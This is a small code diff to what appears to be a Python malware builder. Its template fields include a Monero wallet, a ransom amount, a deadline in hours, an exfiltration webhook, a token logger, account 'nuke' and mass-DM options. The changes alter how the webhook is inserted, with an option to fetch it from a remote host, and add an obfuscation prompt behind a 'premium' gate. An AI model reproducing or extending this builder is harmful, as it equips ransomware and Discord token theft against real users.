@@ -57,7 +57,7 @@ class Main:
             "HOURS": hours,
             "MONERO_WALLET": wallet,
             "CRYPTO_AMOUNT": cost,
-            "WEBHOOK": "'webhook'" if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
+            "WEBHOOK": webhook if not dynamic_webhook else 'requests.get(f"https://{self.ht}/webhook",data={"key":self.k}).text',
             "TOKEN_LOGGER": token_logger,
             "NUKE_TOKEN": auto_nuke,
             "MASSDM": massdm,
@@ -220,6 +220,7 @@ class Main:
 
                 break
             else:
+                print(color("Use random byte characters (Y or N): "), end="> ")
                 print(color('(Premium required)', 'red'))
                 time.sleep(1)
                 self.recursion = 0
